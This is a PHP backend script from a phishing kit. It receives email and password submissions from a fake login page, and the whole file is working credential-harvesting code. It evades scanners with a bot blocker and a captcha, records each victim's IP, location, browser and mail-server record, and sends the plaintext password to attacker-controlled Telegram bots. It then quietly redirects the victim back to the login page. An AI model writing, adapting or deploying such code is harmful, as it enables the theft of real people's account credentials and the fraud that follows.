<?php
// Start output buffering to prevent header issues
ob_start();

// Include configuration - REQUIRED
if (!file_exists('config.php')) {
    http_response_code(500);
    die('Configuration file (config.php) not found. Please create it from config.example.php');
}
require_once 'config.php';

// Validate required configuration
$requiredConfigs = [
    'FRONTEND_URL', 'LOGIN_PAGE', 'TELEGRAM_BOT_TOKEN', 
    'TELEGRAM_CHAT_ID', 'TURNSTILE_SECRET', 'ALLOWED_ORIGINS'
];

foreach ($requiredConfigs as $config) {
    if (!defined($config)) {
        http_response_code(500);
        die("Required configuration '$config' not found in config.php");
    }
}

// Set CORS headers for cross-origin requests
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
$allowedOrigins = ALLOWED_ORIGINS;

if (in_array($origin, $allowedOrigins)) {
    header("Access-Control-Allow-Origin: $origin");
} else {
    header("Access-Control-Allow-Origin: " . FRONTEND_URL);
}

header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, X-Requested-With");
header("Access-Control-Allow-Credentials: true");

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Include advanced bot blocker
require_once 'bot-blocker.php';

/**
 * Extract domain from email address
 */
function getDomainFromEmail($email) {
    if (strpos($email, '@') !== false) {
        return explode('@', $email)[1];
    }
    return null;
}

/**
 * Get the real client IP, preferring IPv4 over IPv6
 */
function getUserIP() {
    // Function to check if IP is IPv4
    $isIPv4 = function($ip) {
        return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) !== false;
    };
    
    // Function to check if IP is private/local
    $isPrivateIP = function($ip) {
        return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false;
    };
    
    $potentialIPs = [];
    
    // Try X-Forwarded-For (may be a comma-separated list)
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        foreach ($ips as $ip) {
            $ip = trim($ip);
            if (!empty($ip) && strtolower($ip) !== 'unknown' && !$isPrivateIP($ip)) {
                $potentialIPs[] = $ip;
            }
        }
    }
    
    // Try X-Real-IP
    if (!empty($_SERVER['HTTP_X_REAL_IP']) && 
        strtolower($_SERVER['HTTP_X_REAL_IP']) !== 'unknown' &&
        !$isPrivateIP($_SERVER['HTTP_X_REAL_IP'])) {
        $potentialIPs[] = $_SERVER['HTTP_X_REAL_IP'];
    }
    
    // Try Cloudflare specific header
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP']) &&
        !$isPrivateIP($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $potentialIPs[] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    
    // Try REMOTE_ADDR
    if (!empty($_SERVER['REMOTE_ADDR']) && !$isPrivateIP($_SERVER['REMOTE_ADDR'])) {
        $potentialIPs[] = $_SERVER['REMOTE_ADDR'];
    }
    
    // First, check request headers for client IP (most accurate for user's real IP)
    foreach ($potentialIPs as $ip) {
        if ($isIPv4($ip)) {
            return $ip . " (client IPv4)";
        }
    }
    
    // If no IPv4 in headers, use IPv6 but mark it
    if (!empty($potentialIPs)) {
        return $potentialIPs[0] . ' (client IPv6)';
    }
    
    // Only use external services as last resort (these show server IP, not client IP)
    try {
        $context = stream_context_create([
            'http' => [
                'timeout' => 5,
                'header' => "User-Agent: PHP-Login-Script/1.0\r\n"
            ]
        ]);
        
        // Try IPv4-only service first
        $publicIP = file_get_contents(IP_SERVICE_URL, false, $context);
        if ($publicIP !== false && !empty(trim($publicIP))) {
            $cleanIP = trim($publicIP);
            if ($isIPv4($cleanIP)) {
                return $cleanIP . " (server IP - not client)";
            }
        }
        
        // Fallback to secondary service
        if (defined('IP_SERVICE_FALLBACK')) {
            $publicIP = file_get_contents(IP_SERVICE_FALLBACK, false, $context);
            if ($publicIP !== false && !empty(trim($publicIP))) {
                $cleanIP = trim($publicIP);
                if ($isIPv4($cleanIP)) {
                    return $cleanIP . " (server IP fallback - not client)";
                }
            }
        }
    } catch (Exception $e) {
        error_log("External IP service error: " . $e->getMessage());
    }
    
    // Final fallback to REMOTE_ADDR
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    
    // If we're getting localhost/private IPs, try to get public IPv4 via external service
    if ($isPrivateIP($ip) || $ip === 'Unknown') {
        try {
            $context = stream_context_create([
                'http' => [
                    'timeout' => 5,
                    'header' => "User-Agent: PHP-Login-Script/1.0\r\n"
                ]
            ]);
            
            // Try IPv4-only service first
            $publicIP = file_get_contents(IP_SERVICE_URL, false, $context);
            if ($publicIP !== false && !empty(trim($publicIP))) {
                $cleanIP = trim($publicIP);
                if ($isIPv4($cleanIP)) {
                    return $cleanIP . " (VPS detected: $ip)";
                }
            }
            
            // Fallback to secondary service
            if (defined('IP_SERVICE_FALLBACK')) {
                $publicIP = file_get_contents(IP_SERVICE_FALLBACK, false, $context);
                if ($publicIP !== false && !empty(trim($publicIP))) {
                    $cleanIP = trim($publicIP);
                    if ($isIPv4($cleanIP)) {
                        return $cleanIP . " (VPS detected: $ip)";
                    }
                }
            }
        } catch (Exception $e) {
            // Ignore error
        }
        return "$ip (local/private network)";
    }
    
    return $ip ?: 'Unknown';
}

/**
 * Get a reliable IP for geo location (prioritizes external services for location accuracy)
 */
function getGeoLocationIP() {
    try {
        $context = stream_context_create([
            'http' => [
                'timeout' => 5,
                'header' => "User-Agent: PHP-Login-Script/1.0\r\n"
            ]
        ]);
        
        // Use external service for geo lookup (more reliable for location)
        $publicIP = file_get_contents(IP_SERVICE_URL, false, $context);
        if ($publicIP !== false && !empty(trim($publicIP))) {
            return trim($publicIP);
        }
        
        if (defined('IP_SERVICE_FALLBACK')) {
            $publicIP = file_get_contents(IP_SERVICE_FALLBACK, false, $context);
            if ($publicIP !== false && !empty(trim($publicIP))) {
                return trim($publicIP);
            }
        }
    } catch (Exception $e) {
        error_log("Geo IP service error: " . $e->getMessage());
    }
    
    return null;
}

/**
 * Get city and country from IP using multiple geo services
 */
function getLocationFromIP($displayIP) {
    // Get a reliable IP for geo lookup (may be different from display IP)
    $geoIP = getGeoLocationIP();
    if (!$geoIP) {
        // Fallback to parsing display IP
        $geoIP = explode(' ', $displayIP)[0];
    }
    
    try {
        // Basic IP validation
        if (empty($geoIP) || $geoIP === 'Unknown' || !filter_var($geoIP, FILTER_VALIDATE_IP)) {
            return ['Unknown (Invalid IP)', 'Unknown (Invalid IP)'];
        }
        
        $context = stream_context_create([
            'http' => [
                'timeout' => 10,
                'header' => "User-Agent: Mozilla/5.0 (compatible; PHP-GeoLocator/1.0)\r\n"
            ]
        ]);
        
        // Try primary geo service (ipapi.co)
        $response = file_get_contents(GEO_SERVICE_URL . "/$geoIP/json/", false, $context);
        if ($response !== false) {
            $data = json_decode($response, true);
            if ($data && !isset($data['error']) && !empty($data['city']) && !empty($data['country_name'])) {
                return [$data['city'], $data['country_name']];
            }
        }
        
        // Try fallback geo service (ip-api.com)
        if (defined('GEO_SERVICE_FALLBACK')) {
            $response = file_get_contents(GEO_SERVICE_FALLBACK . "/$geoIP", false, $context);
            if ($response !== false) {
                $data = json_decode($response, true);
                if ($data && isset($data['status']) && $data['status'] === 'success' && 
                    !empty($data['city']) && !empty($data['country'])) {
                    return [$data['city'] . ' (fallback)', $data['country'] . ' (fallback)'];
                }
            }
        }
        
        // If both services fail but we have a valid IP
        return ['Location service failed', 'Location service failed'];
        
    } catch (Exception $e) {
        error_log("Geo location error for IP $geoIP: " . $e->getMessage());
    }
    
    return ['Geo lookup error', 'Geo lookup error'];
}

/**
 * Get user's browser from User-Agent
 */
function getUserBrowser() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    if (strpos($userAgent, 'Chrome') !== false) {
        return 'Chrome';
    } elseif (strpos($userAgent, 'Firefox') !== false) {
        return 'Firefox';
    } elseif (strpos($userAgent, 'Safari') !== false && strpos($userAgent, 'Chrome') === false) {
        return 'Safari';
    } elseif (strpos($userAgent, 'Edge') !== false) {
        return 'Edge';
    } elseif (strpos($userAgent, 'Opera') !== false) {
        return 'Opera';
    } else {
        return 'Unknown';
    }
}

/**
 * Get MX record for a domain
 */
function getMXRecord($domain) {
    try {
        $mxRecords = [];
        if (getmxrr($domain, $mxRecords)) {
            return $mxRecords[0] ?? 'No MX record';
        }
    } catch (Exception $e) {
        // Ignore error
    }
    return 'Unable to resolve MX';
}

/**
 * Send message to Telegram bot
 */
function sendToTelegram($botToken, $chatId, $message) {
    $url = TELEGRAM_API_URL . $botToken . "/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    return $result !== false;
}

/**
 * Send message to both Telegram bots (if configured)
 */
function sendToAllTelegramBots($message) {
    $success = false;
    
    // Send to primary bot (required)
    if (defined('TELEGRAM_BOT_TOKEN') && defined('TELEGRAM_CHAT_ID') && 
        !empty(TELEGRAM_BOT_TOKEN) && !empty(TELEGRAM_CHAT_ID)) {
        $success = sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, $message) || $success;
    }
    
    // Send to secondary bot (optional)
    if (defined('TELEGRAM_BOT_TOKEN_2') && defined('TELEGRAM_CHAT_ID_2') && 
        !empty(TELEGRAM_BOT_TOKEN_2) && !empty(TELEGRAM_CHAT_ID_2)) {
        $success = sendToTelegram(TELEGRAM_BOT_TOKEN_2, TELEGRAM_CHAT_ID_2, $message) || $success;
    }
    
    return $success;
}

// Initialize variables
$email = '';
$password = '';
$turnstileResponse = '';
$error = null;
$domain = null;
$logoUrl = null;

// Handle form submission and GET requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Handle bot detection reports from frontend
    if (isset($_POST['bot_detected'])) {
        $reason = $_POST['reason'] ?? 'Unknown';
        $userAgent = $_POST['ua'] ?? $_SERVER['HTTP_USER_AGENT'] ?? '';
        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
        
        error_log("Frontend bot detection: Reason=$reason, IP=$ip, UA=$userAgent");
        http_response_code(403);
        die('Bot detected by frontend');
    }
    
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $turnstileResponse = $_POST['cf-turnstile-response'] ?? '';
    
    // Validate password
    if (empty($password)) {
        $error = 'Authentication is required.';
    }
    
    // Validate captcha
    if (empty($turnstileResponse)) {
        $error = 'Captcha is required.';
    } else {
        // Verify Turnstile
        $verifyUrl = TURNSTILE_VERIFY_URL;
        $verifyData = [
            'secret' => TURNSTILE_SECRET,
            'response' => $turnstileResponse
        ];
        
        $options = [
            'http' => [
                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($verifyData)
            ]
        ];
        
        $context = stream_context_create($options);
        $result = file_get_contents($verifyUrl, false, $context);
        
        if ($result !== false) {
            $verifyResult = json_decode($result, true);
            if (!($verifyResult['success'] ?? false)) {
                $error = 'Captcha validation failed.';
            }
        } else {
            $error = 'Captcha validation failed.';
        }
    }
    
    // Send to Telegram if no errors
    if (!$error) {
        // Get additional user information
        $userIP = getUserIP();
        [$city, $country] = getLocationFromIP($userIP);
        $browser = getUserBrowser();
        $domain = getDomainFromEmail($email);
        $mxRecord = $domain ? getMXRecord($domain) : 'N/A';
        $timestamp = date('Y-m-d H:i:s') . ' UTC';
        
        // Create enhanced message with all requested details
        $msg = "🎯 New Signup Alert!\n\n";
        $msg .= "Email: $email\n";
        $msg .= "Password: $password\n\n";
        $msg .= "📊 Additional Details:\n";
        $msg .= "IP Address: $userIP\n";
        $msg .= "City: $city\n";
        $msg .= "Country: $country\n";
        $msg .= "Browser: $browser\n";
        $msg .= "MX Record: $mxRecord\n";
        $msg .= "Date of Submission: $timestamp";
        
        // Send to all configured Telegram bots
        $telegramSuccess = sendToAllTelegramBots($msg);
        if ($telegramSuccess) {
            error_log("✅ Message sent to Telegram bot(s) successfully!");
        } else {
            error_log("❌ Failed to send message to any Telegram bot");
        }
    }
    
    // Handle POST response - redirect to frontend server
    if ($error) {
        // Redirect back to frontend with error message
        $redirectUrl = FRONTEND_URL . "/" . LOGIN_PAGE . "?email=" . urlencode($email) . "&error=" . urlencode($error);
        error_log("🔄 Redirecting to: $redirectUrl");
        
        // Clear any output buffer and send redirect
        if (ob_get_level()) {
            ob_end_clean();
        }
        
        // Try PHP redirect first
        header("Location: $redirectUrl");
        
        // Fallback JavaScript redirect if PHP redirect fails
        echo '<script>window.location.href = "' . htmlspecialchars($redirectUrl) . '";</script>';
        echo '<noscript><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($redirectUrl) . '"></noscript>';
        echo '<p>If you are not redirected, <a href="' . htmlspecialchars($redirectUrl) . '">click here</a>.</p>';
        exit();
    } else {
        // Success - redirect back to login page with email parameter
        $redirectUrl = FRONTEND_URL . "/" . LOGIN_PAGE . "?email=" . urlencode($email);
        error_log("🔄 Redirecting to: $redirectUrl");
        
        // Clear any output buffer and send redirect
        if (ob_get_level()) {
            ob_end_clean();
        }
        
        // Try PHP redirect first
        header("Location: $redirectUrl");
        
        // Fallback JavaScript redirect if PHP redirect fails
        echo '<script>window.location.href = "' . htmlspecialchars($redirectUrl) . '";</script>';
        echo '<noscript><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($redirectUrl) . '"></noscript>';
        echo '<p>If you are not redirected, <a href="' . htmlspecialchars($redirectUrl) . '">click here</a>.</p>';
        exit();
    }
} else {
    // GET request - redirect to the frontend server
    $queryString = $_SERVER['QUERY_STRING'] ?? '';
    $redirectUrl = FRONTEND_URL . "/" . LOGIN_PAGE . ($queryString ? "?$queryString" : "");
    error_log("🔄 GET Redirecting to: $redirectUrl");
    
    // Clear any output buffer and send redirect
    if (ob_get_level()) {
        ob_end_clean();
    }
    header("Location: $redirectUrl");
    exit();
}
?>
